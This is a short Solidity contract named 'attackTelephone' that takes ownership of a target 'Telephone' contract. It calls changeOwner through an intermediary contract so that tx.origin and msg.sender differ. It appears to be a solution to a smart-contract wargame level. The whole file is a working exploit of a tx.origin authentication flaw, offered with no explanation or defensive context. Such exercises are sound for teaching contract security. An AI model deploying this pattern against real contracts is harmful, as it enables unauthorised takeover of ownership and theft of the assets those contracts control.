// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external ;
}

contract attackTelephone{
    Telephone public telephoneContract;
    constructor(address _telephoneContract){
        telephoneContract = Telephone(_telephoneContract);
    }
    function attack() external {
        telephoneContract.changeOwner(msg.sender);
    }
}
